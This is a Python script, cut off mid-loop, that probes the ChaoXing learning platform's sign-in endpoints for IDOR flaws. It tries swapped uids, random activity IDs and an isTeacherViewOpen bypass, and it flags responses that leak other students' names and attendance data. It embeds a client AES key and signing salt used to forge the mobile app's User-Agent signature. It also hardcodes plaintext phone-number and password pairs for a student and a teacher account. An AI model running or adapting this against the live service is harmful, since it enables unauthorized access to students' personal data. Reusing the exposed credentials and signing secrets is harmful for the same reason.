#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ChaoXing Sign-in Statistics & IDOR Vulnerability Test
测试签到统计功能及IDOR漏洞
"""

import base64, hashlib, json, uuid, requests, urllib3, time, re
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

urllib3.disable_warnings()

AES_KEY = b"u2oh6Vu^HWe4_AES"
SCHILD_SALT = "ipL$TkeiEmfy1gTXb2XHrdLN0a@7c^vu"
LOGIN_URL = "https://passport2.chaoxing.com/fanyalogin"
COURSE_ID = "257485372"
CLASS_ID = "132821141"
BASE = "https://mobilelearn.chaoxing.com"
MOOC_BASE = "https://mooc1-api.chaoxing.com/mooc-ans"

PC_UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"

def aes_enc(p):
    c = AES.new(AES_KEY, AES.MODE_CBC, AES_KEY)
    return base64.b64encode(c.encrypt(pad(p.encode(), AES.block_size))).decode()

def schild_sign(model, locale, version, build, imei):
    parts = [f"(schild:{SCHILD_SALT})", f"(device:{model})", f"Language/{locale}",
             f"com.chaoxing.mobile/ChaoXingStudy_3_{version}_android_phone_{build}",
             f"(@Kalimdor)_{imei}"]
    return hashlib.md5(" ".join(parts).encode()).hexdigest()

def get_mobile_ua():
    imei = uuid.uuid4().hex[:32]
    sc = schild_sign("MI10", "zh_CN", "6.7.2", "10941_314", imei)
    return (f"Mozilla/5.0 (Linux; Android 16; MI10 Build/OPM1.171019.019; wv) "
            f"AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.99 Mobile Safari/537.36 "
            f"(schild:{sc}) (device:MI10) Language/zh_CN "
            f"com.chaoxing.mobile/ChaoXingStudy_3_6.7.2_android_phone_10941_314 "
            f"(@Kalimdor)_{imei}")

def login(phone, pwd):
    s = requests.Session()
    s.verify = False
    ua = get_mobile_ua()
    s.headers.update({"User-Agent": ua, "Accept": "application/json, text/plain, */*", "Accept-Language": "zh_CN"})
    s.post(LOGIN_URL, data={"fid": "-1", "uname": aes_enc(phone), "password": aes_enc(pwd),
                            "refer": "http%3A%2F%2Fi.mooc.chaoxing.com", "t": "true",
                            "forbidotherlogin": "0", "validate": "", "doubleFactorLogin": "0",
                            "independentId": "0", "independentNameId": "0"},
           allow_redirects=False, timeout=30)
    puid = ""
    for c in s.cookies:
        if c.name in ("UID", "_uid"):
            puid = c.value
    try: s.get("https://i.chaoxing.com/base", timeout=20, allow_redirects=True)
    except: pass
    try: s.get("https://mooc1-api.chaoxing.com/mooc-ans/mycourse/backclazzdata?view=json&m=0", timeout=20)
    except: pass
    return s, puid

def safe_json(r):
    try: return r.json()
    except: return {"_raw_status": r.status_code, "_raw_text": r.text[:500]}

def trunc(text, limit=800):
    s = str(text)
    if len(s) > limit:
        return s[:limit] + f"\n... [truncated, total {len(s)} chars]"
    return s

def print_section(title):
    print(f"\n{'='*70}")
    print(f"  {title}")
    print(f"{'='*70}")

def check_sensitive(data_str, context=""):
    """Check if response contains other students' data"""
    flags = []
    # Look for patterns indicating multiple student records
    if isinstance(data_str, str):
        if '"name"' in data_str and '"uid"' in data_str:
            # Count occurrences of uid patterns
            uid_count = len(re.findall(r'"uid"\s*:', data_str))
            if uid_count > 1:
                flags.append("!!!SENSITIVE!!! - 可能包含其他学生数据")
        if '"studentName"' in data_str or '"studentId"' in data_str:
            flags.append("!!!SENSITIVE!!! - 包含学生信息字段")
    return flags

def check_idor(data, target_uid, session_uid=""):
    """Check if response contains data belonging to target_uid (not session_uid)"""
    flags = []
    data_str = json.dumps(data, ensure_ascii=False) if isinstance(data, dict) else str(data)
    # Only flag as IDOR if the target_uid appears in a uid field AND it's not the session uid
    if target_uid in data_str and target_uid != session_uid:
        # More precise check: look for uid field specifically
        uid_pattern = f'"uid":\\s*{target_uid}'
        if re.search(uid_pattern, data_str):
            flags.append(f"!!!IDOR!!! - 响应包含目标uid={target_uid}的数据")
    return flags


# ============================================================
# MAIN
# ============================================================
def main():
    findings = {
        "sensitive": [],
        "idor": [],
        "stats": [],
        "errors": [],
    }

    # ----------------------------------------------------------
    # Part 1: Login & Get activity list
    # ----------------------------------------------------------
    print_section("Part 1: 登录并获取活动列表")

    print("[*] 正在登录学生账号...")
    s_student, puid_s = login("18436633997", "3.1415926Cpy")
    print(f"    学生 puid: {puid_s}")

    print("[*] 正在登录教师账号...")
    s_teacher, puid_t = login("19712720708", "3.1415926Cpy")
    print(f"    教师 puid: {puid_t}")

    if not puid_s or not puid_t:
        print("!!! 登录失败，退出")
        return

    # Get activity list (student)
    print("\n[*] 获取学生活动列表...")
    act_url = f"{BASE}/ppt/activeAPI/taskactivelist"
    params_s = {"courseId": COURSE_ID, "classId": CLASS_ID, "uid": puid_s}
    try:
        r = s_student.get(act_url, params=params_s, timeout=30)
        act_data_s = safe_json(r)
        print(f"    状态码: {r.status_code}")
        print(f"    响应: {trunc(json.dumps(act_data_s, ensure_ascii=False), 1000)}")
    except Exception as e:
        print(f"    请求失败: {e}")
        act_data_s = {}

    # Get activity list (teacher) - try with different parameters
    print("\n[*] 获取教师活动列表...")
    params_t = {"courseId": COURSE_ID, "classId": CLASS_ID, "uid": puid_t}
    try:
        r = s_teacher.get(act_url, params=params_t, timeout=30)
        act_data_t = safe_json(r)
        print(f"    状态码: {r.status_code}")
        print(f"    响应: {trunc(json.dumps(act_data_t, ensure_ascii=False), 1000)}")
    except Exception as e:
        print(f"    请求失败: {e}")
        act_data_t = {}

    # Teacher may need cpi parameter
    if not act_data_t.get("activeList"):
        print("\n[*] 教师活动列表为空，尝试带cpi参数...")
        try:
            params_t2 = {"courseId": COURSE_ID, "classId": CLASS_ID, "uid": puid_t, "cpi": cpi_t if 'cpi_t' in dir() else ""}
            r = s_teacher.get(act_url, params=params_t2, timeout=30)
            act_data_t2 = safe_json(r)
            print(f"    状态码: {r.status_code}")
            print(f"    响应: {trunc(json.dumps(act_data_t2, ensure_ascii=False), 1000)}")
            if act_data_t2.get("activeList"):
                act_data_t = act_data_t2
        except Exception as e:
            print(f"    请求失败: {e}")

    # Also try teacher with student-style request
    if not act_data_t.get("activeList"):
        print("\n[*] 教师活动列表仍为空，尝试不同API...")
        try:
            url2 = f"{BASE}/newsign/listSignForTeacher"
            params_t3 = {"courseId": COURSE_ID, "classId": CLASS_ID, "activeType": 2}
            r = s_teacher.get(url2, params=params_t3, timeout=30)
            data = safe_json(r)
            print(f"    listSignForTeacher 状态码: {r.status_code}")
            print(f"    响应: {trunc(json.dumps(data, ensure_ascii=False), 800)}")
        except Exception as e:
            print(f"    请求失败: {e}")

    # Extract sign-in activities
    sign_activities = []
    for act_data in [act_data_s, act_data_t]:
        try:
            # Response may have activeList at top level or under "data"
            items = act_data.get("activeList", [])
            if not items and isinstance(act_data.get("data"), dict):
                items = act_data["data"].get("activeList", [])
            for item in items:
                atype = item.get("activeType")
                # activeType 2 = sign-in
                name = item.get("name", "") or item.get("nameOne", "")
                aid = item.get("id") or item.get("activeId")
                # Also try to extract from url field
                if not aid:
                    url_field = item.get("url", "")
                    m = re.search(r'activePrimaryId=(\d+)', url_field)
                    if m:
                        aid = m.group(1)
                if atype == 2 or "签到" in name:
                    if aid and str(aid) not in [a[0] for a in sign_activities]:
                        sign_activities.append((str(aid), name))
        except Exception as e:
            print(f"    解析活动列表异常: {e}")

    # Also include ALL activities from student list for broader testing
    try:
        items = act_data_s.get("activeList", [])
        if not items and isinstance(act_data_s.get("data"), dict):
            items = act_data_s["data"].get("activeList", [])
        for item in items:
            aid = item.get("id") or item.get("activeId")
            if not aid:
                url_field = item.get("url", "")
                m = re.search(r'activePrimaryId=(\d+)', url_field)
                if m:
                    aid = m.group(1)
            name = item.get("name", "") or item.get("nameOne", "")
            atype = item.get("activeType", "?")
            if aid and str(aid) not in [a[0] for a in sign_activities]:
                sign_activities.append((str(aid), f"[type={atype}]{name}"))
    except:
        pass

    print(f"\n[*] 找到签到活动: {len(sign_activities)} 个")
    for aid, name in sign_activities:
        print(f"    - activeId={aid}, name={name}")

    # Extract isTeacherViewOpen from activity URLs
    teacher_view_open_map = {}
    try:
        items = act_data_s.get("activeList", [])
        for item in items:
            url_field = item.get("url", "")
            m = re.search(r'activePrimaryId=(\d+)', url_field)
            if m:
                aid = m.group(1)
                m2 = re.search(r'isTeacherViewOpen=(\d+)', url_field)
                if m2:
                    teacher_view_open_map[aid] = m2.group(1)
    except:
        pass

    if teacher_view_open_map:
        print(f"\n[*] isTeacherViewOpen 设置:")
        for aid, val in teacher_view_open_map.items():
            status = "允许查看" if val == "1" else "不允许查看"
            print(f"    - activeId={aid}: isTeacherViewOpen={val} ({status})")
    else:
        print(f"\n[*] 未从活动URL中提取到isTeacherViewOpen参数")

    if not sign_activities:
        print("    未找到签到活动，使用测试ID")
        sign_activities = [("unknown", "测试活动")]

    # Get cpi
    print("\n[*] 获取cpi...")
    cpi_s = ""
    cpi_t = ""
    try:
        r = s_student.get("https://mooc1-api.chaoxing.com/mooc-ans/mycourse/backclazzdata?view=json&m=0", timeout=20)
        course_data = safe_json(r)
        print(f"    学生课程数据: {trunc(json.dumps(course_data, ensure_ascii=False), 600)}")
        # Try to find cpi
        if isinstance(course_data, dict):
            channel_list = course_data.get("channelList", course_data.get("data", []))
            if isinstance(channel_list, list):
                for ch in channel_list:
                    if isinstance(ch, dict):
                        cpi_val = ch.get("cpi") or ch.get("cpid")
                        cid = ch.get("courseid") or ch.get("courseId")
                        if cid and str(cid) == COURSE_ID and cpi_val:
                            cpi_s = str(cpi_val)
                            break
                    if isinstance(ch, dict) and ch.get("cpi"):
                        if not cpi_s:
                            cpi_s = str(ch["cpi"])
    except Exception as e:
        print(f"    获取学生cpi失败: {e}")

    try:
        r = s_teacher.get("https://mooc1-api.chaoxing.com/mooc-ans/mycourse/backclazzdata?view=json&m=0", timeout=20)
        course_data = safe_json(r)
        if isinstance(course_data, dict):
            channel_list = course_data.get("channelList", course_data.get("data", []))
            if isinstance(channel_list, list):
                for ch in channel_list:
                    if isinstance(ch, dict):
                        cpi_val = ch.get("cpi") or ch.get("cpid")
                        cid = ch.get("courseid") or ch.get("courseId")
                        if cid and str(cid) == COURSE_ID and cpi_val:
                            cpi_t = str(cpi_val)
                            break
                    if isinstance(ch, dict) and ch.get("cpi"):
                        if not cpi_t:
                            cpi_t = str(ch["cpi"])
    except Exception as e:
        print(f"    获取教师cpi失败: {e}")

    print(f"    学生 cpi: {cpi_s or '未获取到'}")
    print(f"    教师 cpi: {cpi_t or '未获取到'}")

    # Use first sign activity for detailed testing
    test_aid = sign_activities[0][0] if sign_activities else "unknown"

    # ----------------------------------------------------------
    # Part 2: Test sign-in statistics viewing by students
    # ----------------------------------------------------------
    print_section("Part 2: 测试学生查看签到统计")

    for aid, aname in sign_activities[:3]:  # Test up to 3 activities
        print(f"\n--- 测试活动: {aname} (activeId={aid}) ---")

        # Test 1: signedResult basic
        print(f"\n  [2.1] /pptSign/signedResult (学生, 移动端UA)")
        try:
            url = f"{BASE}/pptSign/signedResult"
            params = {"activeId": aid, "classId": CLASS_ID, "courseId": COURSE_ID, "uid": puid_s}
            r = s_student.get(url, params=params, timeout=30)
            print(f"    状态码: {r.status_code}")
            content_type = r.headers.get("Content-Type", "")
            print(f"    Content-Type: {content_type}")
            if "html" in content_type.lower():
                print(f"    返回HTML, 长度: {len(r.text)}")
                print(f"    前800字符: {trunc(r.text, 800)}")
                # Check for embedded data
                if "统计" in r.text or "签到" in r.text:
                    findings["stats"].append(f"signedResult(学生)包含签到相关内容 - aid={aid}")
                    print("    !!!STATS!!! - 页面包含签到/统计相关内容")
            else:
                data = safe_json(r)
                print(f"    响应: {trunc(json.dumps(data, ensure_ascii=False), 800)}")
                flags = check_sensitive(json.dumps(data, ensure_ascii=False))
                for f in flags:
                    print(f"    {f}")
                    findings["sensitive"].append(f)
        except Exception as e:
            print(f"    请求失败: {e}")
            findings["errors"].append(f"2.1: {e}")

        # Test 2: signedResult with cpi
        if cpi_s:
            print(f"\n  [2.2] /pptSign/signedResult (学生, 带cpi)")
            try:
                url = f"{BASE}/pptSign/signedResult"
                params = {"activeId": aid, "classId": CLASS_ID, "courseId": COURSE_ID, "uid": puid_s, "cpi": cpi_s}
                r = s_student.get(url, params=params, timeout=30)
                print(f"    状态码: {r.status_code}")
                content_type = r.headers.get("Content-Type", "")
                if "html" in content_type.lower():
                    print(f"    返回HTML, 长度: {len(r.text)}")
                    print(f"    前500字符: {trunc(r.text, 500)}")
                else:
                    data = safe_json(r)
                    print(f"    响应: {trunc(json.dumps(data, ensure_ascii=False), 800)}")
            except Exception as e:
                print(f"    请求失败: {e}")

        # Test 3: signedResult with PC UA
        print(f"\n  [2.3] /pptSign/signedResult (学生, PC浏览器UA)")
        try:
            url = f"{BASE}/pptSign/signedResult"
            params = {"activeId": aid, "classId": CLASS_ID, "courseId": COURSE_ID, "uid": puid_s}
            headers = dict(s_student.headers)
            headers["User-Agent"] = PC_UA
            r = s_student.get(url, params=params, headers=headers, timeout=30)
            print(f"    状态码: {r.status_code}")
            content_type = r.headers.get("Content-Type", "")
            if "html" in content_type.lower():
                print(f"    返回HTML, 长度: {len(r.text)}")
                print(f"    前800字符: {trunc(r.text, 800)}")
                if "统计" in r.text or "签到" in r.text:
                    findings["stats"].append(f"signedResult(PC UA)包含签到相关内容 - aid={aid}")
                    print("    !!!STATS!!! - 页面包含签到/统计相关内容")
            else:
                data = safe_json(r)
                print(f"    响应: {trunc(json.dumps(data, ensure_ascii=False), 800)}")
        except Exception as e:
            print(f"    请求失败: {e}")

        # Test 4: preSign page
        print(f"\n  [2.4] /widget/sign/pcStuSignController/preSign (学生)")
        try:
            url = f"{BASE}/widget/sign/pcStuSignController/preSign"
            params = {"activeId": aid, "courseId": COURSE_ID, "classId": CLASS_ID}
            r = s_student.get(url, params=params, timeout=30)
            print(f"    状态码: {r.status_code}")
            content_type = r.headers.get("Content-Type", "")
            if "html" in content_type.lower():
                print(f"    返回HTML, 长度: {len(r.text)}")
                print(f"    前800字符: {trunc(r.text, 800)}")
                # Look for statistics data in HTML
                if "统计" in r.text or "已签" in r.text or "未签" in r.text:
                    findings["stats"].append(f"preSign页面包含统计信息 - aid={aid}")
                    print("    !!!STATS!!! - 页面包含统计信息")
            else:
                data = safe_json(r)
                print(f"    响应: {trunc(json.dumps(data, ensure_ascii=False), 800)}")
        except Exception as e:
            print(f"    请求失败: {e}")

        # Test 5: signDetail
        print(f"\n  [2.5] /pptSign/signDetail (学生)")
        try:
            url = f"{BASE}/pptSign/signDetail"
            params = {"activeId": aid, "uid": puid_s}
            r = s_student.get(url, params=params, timeout=30)
            print(f"    状态码: {r.status_code}")
            content_type = r.headers.get("Content-Type", "")
            if "html" in content_type.lower():
                print(f"    返回HTML, 长度: {len(r.text)}")
                print(f"    前800字符: {trunc(r.text, 800)}")
            else:
                data = safe_json(r)
                print(f"    响应: {trunc(json.dumps(data, ensure_ascii=False), 800)}")
                flags = check_sensitive(json.dumps(data, ensure_ascii=False))
                for f in flags:
                    print(f"    {f}")
                    findings["sensitive"].append(f)
        except Exception as e:
            print(f"    请求失败: {e}")

        # Test 6: v2 signIn (personal)
        print(f"\n  [2.6] /v2/apis/sign/signIn (学生, 个人)")
        try:
            url = f"{BASE}/v2/apis/sign/signIn"
            params = {"activeId": aid, "uid": puid_s}
            r = s_student.get(url, params=params, timeout=30)
            data = safe_json(r)
            print(f"    状态码: {r.status_code}")
            print(f"    响应: {trunc(json.dumps(data, ensure_ascii=False), 800)}")
            flags = check_sensitive(json.dumps(data, ensure_ascii=False))
            for f in flags:
                print(f"    {f}")
                findings["sensitive"].append(f)
        except Exception as e:
            print(f"    请求失败: {e}")

        # Test 7: Teacher's signedResult for comparison
        print(f"\n  [2.7] /pptSign/signedResult (教师, 作为对比)")
        try:
            url = f"{BASE}/pptSign/signedResult"
            params = {"activeId": aid, "classId": CLASS_ID, "courseId": COURSE_ID, "uid": puid_t}
            r = s_teacher.get(url, params=params, timeout=30)
            print(f"    状态码: {r.status_code}")
            content_type = r.headers.get("Content-Type", "")
            if "html" in content_type.lower():
                print(f"    返回HTML, 长度: {len(r.text)}")
                print(f"    前800字符: {trunc(r.text, 800)}")
                if "统计" in r.text or "已签" in r.text:
                    findings["stats"].append(f"教师signedResult包含统计信息 - aid={aid}")
                    print("    !!!STATS!!! - 教师页面包含统计信息")
            else:
                data = safe_json(r)
                print(f"    响应: {trunc(json.dumps(data, ensure_ascii=False), 800)}")
        except Exception as e:
            print(f"    请求失败: {e}")

        # Test 8: newsign/preSign (the URL from activity list)
        print(f"\n  [2.8] /newsign/preSign (学生, 活动列表中的URL)")
        try:
            url = f"{BASE}/newsign/preSign"
            params = {"courseId": COURSE_ID, "classId": CLASS_ID, "activePrimaryId": aid,
                      "general": "1", "sys": "1", "ls": "1", "appType": "15", "uid": puid_s}
            r = s_student.get(url, params=params, timeout=30)
            print(f"    状态码: {r.status_code}")
            content_type = r.headers.get("Content-Type", "")
            if "html" in content_type.lower():
                print(f"    返回HTML, 长度: {len(r.text)}")
                print(f"    前1200字符: {trunc(r.text, 1200)}")
                # Look for statistics
                stat_patterns = re.findall(r'(?:已签|未签|签到|统计|人数|率|isTeacherViewOpen)[^<]{0,200}', r.text)
                if stat_patterns:
                    print(f"    !!!STATS!!! 发现统计数据: {stat_patterns[:10]}")
                    findings["stats"].append(f"newsign/preSign包含统计数据 - aid={aid}")
                # Look for student data
                student_patterns = re.findall(r'"(?:name|uid|studentName|userName)"\s*:\s*"[^"]*"', r.text)
                if student_patterns:
                    print(f"    !!!SENSITIVE!!! 发现学生数据: {student_patterns[:10]}")
                    findings["sensitive"].append(f"newsign/preSign包含学生数据 - aid={aid}")
            else:
                data = safe_json(r)
                print(f"    响应: {trunc(json.dumps(data, ensure_ascii=False), 800)}")
        except Exception as e:
            print(f"    请求失败: {e}")

        # Test 9: Try with isTeacherViewOpen=1 (bypass attempt)
        print(f"\n  [2.9] /newsign/preSign (学生, isTeacherViewOpen=1 绕过尝试)")
        try:
            url = f"{BASE}/newsign/preSign"
            params = {"courseId": COURSE_ID, "classId": CLASS_ID, "activePrimaryId": aid,
                      "general": "1", "sys": "1", "ls": "1", "appType": "15", "uid": puid_s,
                      "isTeacherViewOpen": "1"}
            r = s_student.get(url, params=params, timeout=30)
            print(f"    状态码: {r.status_code}")
            content_type = r.headers.get("Content-Type", "")
            if "html" in content_type.lower():
                print(f"    返回HTML, 长度: {len(r.text)}")
                print(f"    前800字符: {trunc(r.text, 800)}")
                if "统计" in r.text or "已签" in r.text:
                    print("    !!!STATS!!! - isTeacherViewOpen=1绕过可能成功!")
                    findings["stats"].append(f"isTeacherViewOpen=1绕过可能成功 - aid={aid}")
            else:
                data = safe_json(r)
                print(f"    响应: {trunc(json.dumps(data, ensure_ascii=False), 800)}")
        except Exception as e:
            print(f"    请求失败: {e}")

    # ----------------------------------------------------------
    # Part 3: IDOR testing
    # ----------------------------------------------------------
    print_section("Part 3: IDOR漏洞测试")

    for aid, aname in sign_activities[:3]:
        print(f"\n--- 测试活动: {aname} (activeId={aid}) ---")

        # 3.1 Cross-user: Student queries with teacher's uid
        print(f"\n  [3.1] IDOR - 学生查询教师uid的签到数据")
        print(f"  [3.1a] /v2/apis/sign/signIn?activeId={aid}&uid={puid_t}")
        try:
            url = f"{BASE}/v2/apis/sign/signIn"
            params = {"activeId": aid, "uid": puid_t}
            r = s_student.get(url, params=params, timeout=30)
            data = safe_json(r)
            print(f"    状态码: {r.status_code}")
            print(f"    响应: {trunc(json.dumps(data, ensure_ascii=False), 800)}")
            # Check if the returned uid matches the requested uid or the session uid
            returned_uid = ""
            if isinstance(data, dict) and isinstance(data.get("data"), dict):
                returned_uid = str(data["data"].get("uid", ""))
            if returned_uid == puid_t:
                print(f"    !!!IDOR!!! - 返回了教师uid={puid_t}的数据!")
                findings["idor"].append(f"跨用户IDOR: 学生获取教师签到数据 - aid={aid}")
            elif returned_uid == puid_s:
                print(f"    [安全] uid参数被忽略, 返回的是学生自己的数据(uid={puid_s})")
                print(f"    [注意] 虽然不是IDOR, 但说明uid参数无效, 服务器使用session认证")
            else:
                print(f"    返回uid={returned_uid}, 请求uid={puid_t}")
            flags2 = check_sensitive(json.dumps(data, ensure_ascii=False))
            for f in flags2:
                print(f"    {f}")
                findings["sensitive"].append(f)
        except Exception as e:
            print(f"    请求失败: {e}")

        print(f"\n  [3.1b] /pptSign/signDetail?activeId={aid}&uid={puid_t}")
        try:
            url = f"{BASE}/pptSign/signDetail"
            params = {"activeId": aid, "uid": puid_t}
            r = s_student.get(url, params=params, timeout=30)
            print(f"    状态码: {r.status_code}")
            content_type = r.headers.get("Content-Type", "")
            if "html" in content_type.lower():
                print(f"    返回HTML, 长度: {len(r.text)}")
                print(f"    前800字符: {trunc(r.text, 800)}")
                if puid_t in r.text:
                    print(f"    !!!IDOR!!! - 学生可以查看教师(uid={puid_t})的签到详情")
                    findings["idor"].append(f"signDetail HTML包含教师uid - aid={aid}")
            else:
                data = safe_json(r)
                print(f"    响应: {trunc(json.dumps(data, ensure_ascii=False), 800)}")
                flags = check_idor(data, puid_t)
                for f in flags:
                    print(f"    {f}")
                    findings["idor"].append(f)
        except Exception as e:
            print(f"    请求失败: {e}")

        # 3.2 Cross-user: Student queries signedResult with teacher's uid
        print(f"\n  [3.1c] /pptSign/signedResult?activeId={aid}&uid={puid_t} (学生session, 教师uid)")
        try:
            url = f"{BASE}/pptSign/signedResult"
            params = {"activeId": aid, "classId": CLASS_ID, "courseId": COURSE_ID, "uid": puid_t}
            r = s_student.get(url, params=params, timeout=30)
            print(f"    状态码: {r.status_code}")
            content_type = r.headers.get("Content-Type", "")
            if "html" in content_type.lower():
                print(f"    返回HTML, 长度: {len(r.text)}")
                print(f"    前500字符: {trunc(r.text, 500)}")
            else:
                data = safe_json(r)
                print(f"    响应: {trunc(json.dumps(data, ensure_ascii=False), 800)}")
        except Exception as e:
            print(f"    请求失败: {e}")

        # 3.3 Cross-activity: Student queries different activities
        print(f"\n  [3.2] 跨活动访问测试")
        for other_aid, other_name in sign_activities:
            if other_aid == aid:
                continue
            print(f"  [3.2] 学生访问活动 {other_name}({other_aid}) 的签到数据")
            try:
                url = f"{BASE}/v2/apis/sign/signIn"
                params = {"activeId": other_aid, "uid": puid_s}
                r = s_student.get(url, params=params, timeout=30)
                data = safe_json(r)
                result = data.get("result", None)
                msg = data.get("msg", "")
                returned_uid = ""
                if isinstance(data, dict) and isinstance(data.get("data"), dict):
                    returned_uid = str(data["data"].get("uid", ""))
                if result == 1 or result == True:
                    if returned_uid == puid_s:
                        print(f"    result={result}, 返回uid={returned_uid}(学生自己) - 可访问自己的签到记录")
                        findings["idor"].append(f"跨活动访问: 学生可访问其他活动的个人签到数据 - aid={other_aid}")
                    elif returned_uid:
                        print(f"    !!!IDOR!!! result={result}, 返回uid={returned_uid}(非本人!) - 跨用户数据泄露!")
                        findings["idor"].append(f"跨活动跨用户IDOR: aid={other_aid}, 返回uid={returned_uid}")
                    else:
                        print(f"    result={result}, msg={msg}")
                else:
                    print(f"    result={result}, msg={msg}")
            except Exception as e:
                print(f"    请求失败: {e}")

        # 3.4 Cross-course: Random activity IDs
        print(f"\n  [3.3] 跨课程访问测试 (随机activeId)")
        random_aids = ["999999999", "100000000", "123456789"]
        for raid in random_aids:
            try:
                url = f"{BASE}/v2/apis/sign/signIn"
                params = {"activeId": raid, "uid": puid_s}
                r = s_student.get(url, params=params, timeout=30)
                data = safe_json(r)
                result = data.get("result", None)
                msg = data.get("msg", "")
                print(f"    activeId={raid}: result={result}, msg={trunc(str(msg), 100)}")
                if result == 1 or result == True:
                    print(f"    !!!IDOR!!! - 学生可以访问随机活动ID的签到数据")
                    findings["idor"].append(f"随机activeId访问成功 - aid={raid}")
            except Exception as e:
                print(f"    activeId={raid}: 请求失败: {e}")

    # ----------------------------------------------------------
    # Part 4: Deep analysis of V2 signIn response
    # ----------------------------------------------------------
    print_section("Part 4: V2 signIn 响应深度分析")

    for aid, aname in sign_activities[:3]:
        print(f"\n--- 分析活动: {aname} (activeId={aid}) ---")

        # Student's own data
        print(f"\n  [4.1] 学生自己的签到数据")
        try:
            url = f"{BASE}/v2/apis/sign/signIn"
            params = {"activeId": aid, "uid": puid_s}
            r = s_student.get(url, params=params, timeout=30)
            data = safe_json(r)
            print(f"    完整响应: {trunc(json.dumps(data, ensure_ascii=False, indent=2), 1500)}")

            # Analyze fields
            if isinstance(data, dict):
                inner = data.get("data", data)
                if isinstance(inner, dict):
                    print(f"\n    字段分析:")
                    for key in inner:
                        val = inner[key]
                        val_str = str(val)
                        if len(val_str) > 100:
                            val_str = val_str[:100] + "..."
                        print(f"      {key}: {val_str}")

                    # Check specific fields
                    for field in ["recordId", "signId", "updatetime", "createtime", "createTime",
                                  "updateTime", "location", "device", "address", "longitude", "latitude"]:
                        if field in inner:
                            print(f"    >>> 发现字段: {field} = {inner[field]}")

                    # Check for other students' info
                    for field in ["studentList", "signList", "signedList", "unSignedList", "members"]:
                        if field in inner:
                            print(f"    !!!SENSITIVE!!! 发现其他学生数据字段: {field}")
                            findings["sensitive"].append(f"V2 signIn包含{field} - aid={aid}")
        except Exception as e:
            print(f"    请求失败: {e}")

        # Teacher's view for comparison
        print(f"\n  [4.2] 教师查看签到数据 (对比)")
        try:
            url = f"{BASE}/v2/apis/sign/signIn"
            params = {"activeId": aid, "uid": puid_t}
            r = s_teacher.get(url, params=params, timeout=30)
            data = safe_json(r)
            print(f"    完整响应: {trunc(json.dumps(data, ensure_ascii=False, indent=2), 1500)}")

            if isinstance(data, dict):
                inner = data.get("data", data)
                if isinstance(inner, dict):
                    print(f"\n    字段分析:")
                    for key in inner:
                        val = inner[key]
                        val_str = str(val)
                        if len(val_str) > 100:
                            val_str = val_str[:100] + "..."
                        print(f"      {key}: {val_str}")
        except Exception as e:
            print(f"    请求失败: {e}")

    # ----------------------------------------------------------
    # Part 5: Test signedResult page parsing
    # ----------------------------------------------------------
    print_section("Part 5: signedResult 页面解析")

    for aid, aname in sign_activities[:2]:
        print(f"\n--- 解析活动: {aname} (activeId={aid}) ---")

        # Mobile UA
        print(f"\n  [5.1] signedResult (移动端UA)")
        try:
            url = f"{BASE}/pptSign/signedResult"
            params = {"activeId": aid, "classId": CLASS_ID, "courseId": COURSE_ID, "uid": puid_s}
            r = s_student.get(url, params=params, timeout=30)
            content_type = r.headers.get("Content-Type", "")
            print(f"    状态码: {r.status_code}, Content-Type: {content_type}")

            if "html" in content_type.lower():
                html = r.text
                print(f"    HTML长度: {len(html)}")

                # Look for embedded JavaScript
                js_blocks = re.findall(r'<script[^>]*>(.*?)</script>', html, re.DOTALL)
                if js_blocks:
                    print(f"    找到 {len(js_blocks)} 个script块")
                    for i, js in enumerate(js_blocks):
                        if js.strip():
                            print(f"    Script {i}: {trunc(js.strip(), 300)}")
                            # Look for API URLs
                            api_urls = re.findall(r'["\']([^"\']*(?:api|sign|active|detail)[^"\']*)["\']', js)
                            if api_urls:
                                print(f"    发现API URLs: {api_urls}")

                # Look for AJAX calls
                ajax_calls = re.findall(r'\$\.(?:ajax|get|post)\([^)]*\)', html)
                if ajax_calls:
                    print(f"    发现AJAX调用: {len(ajax_calls)}")
                    for call in ajax_calls[:5]:
                        print(f"      {trunc(call, 200)}")

                # Look for student data patterns
                student_patterns = re.findall(r'"(?:name|uid|studentName|userName)"\s*:\s*"[^"]*"', html)
                if student_patterns:
                    print(f"    !!!SENSITIVE!!! 发现学生数据模式: {student_patterns[:10]}")
                    findings["sensitive"].append(f"signedResult HTML包含学生数据 - aid={aid}")

                # Look for statistics data
                stat_patterns = re.findall(r'(?:已签|未签|签到|统计|人数|率)[^<]{0,100}', html)
                if stat_patterns:
                    print(f"    !!!STATS!!! 发现统计数据: {stat_patterns[:10]}")
                    findings["stats"].append(f"signedResult HTML包含统计数据 - aid={aid}")

                print(f"\n    HTML前1500字符:\n{trunc(html, 1500)}")
            else:
                data = safe_json(r)
                print(f"    JSON响应: {trunc(json.dumps(data, ensure_ascii=False, indent=2), 1500)}")
        except Exception as e:
            print(f"    请求失败: {e}")

        # PC UA
        print(f"\n  [5.2] signedResult (PC浏览器UA)")
        try:
            url = f"{BASE}/pptSign/signedResult"
            params = {"activeId": aid, "classId": CLASS_ID, "courseId": COURSE_ID, "uid": puid_s}
            headers = dict(s_student.headers)
            headers["User-Agent"] = PC_UA
            r = s_student.get(url, params=params, headers=headers, timeout=30)
            content_type = r.headers.get("Content-Type", "")
            print(f"    状态码: {r.status_code}, Content-Type: {content_type}")

            if "html" in content_type.lower():
                html = r.text
                print(f"    HTML长度: {len(html)}")

                # Quick analysis
                stat_patterns = re.findall(r'(?:已签|未签|签到|统计|人数|率)[^<]{0,100}', html)
                if stat_patterns:
                    print(f"    !!!STATS!!! 发现统计数据: {stat_patterns[:10]}")
                    findings["stats"].append(f"signedResult(PC UA)包含统计数据 - aid={aid}")

                student_patterns = re.findall(r'"(?:name|uid|studentName|userName)"\s*:\s*"[^"]*"', html)
                if student_patterns:
                    print(f"    !!!SENSITIVE!!! 发现学生数据模式: {student_patterns[:10]}")
                    findings["sensitive"].append(f"signedResult(PC UA)包含学生数据 - aid={aid}")

                print(f"\n    HTML前1500字符:\n{trunc(html, 1500)}")
            else:
                data = safe_json(r)
                print(f"    JSON响应: {trunc(json.dumps(data, ensure_ascii=False, indent=2), 1500)}")
        except Exception as e:
            print(f"    请求失败: {e}")

    # ----------------------------------------------------------
    # Part 6: Test mooc1-api domain
    # ----------------------------------------------------------
    print_section("Part 6: mooc1-api 域名测试")

    for aid, aname in sign_activities[:2]:
